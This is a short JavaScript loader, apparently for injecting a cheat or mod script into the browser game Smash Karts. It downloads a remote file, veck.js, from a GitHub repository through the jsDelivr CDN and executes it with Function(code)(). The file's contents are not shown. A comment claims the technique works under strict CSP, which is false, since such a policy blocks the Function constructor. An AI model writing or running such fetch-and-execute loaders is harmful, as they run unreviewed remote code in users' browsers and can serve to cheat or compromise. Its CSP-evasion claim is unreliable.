const URL = "https://cdn.jsdelivr.net/gh/suppressfinallygotgh/smashkarts@main/veck.js";

fetch(URL)
  .then(r => r.text())
  .then(code => {
    try {
      // Works even under strict CSP
      Function(code)();
    } catch (e) {
      console.error(e);
    }
  })
  .catch(console.error);
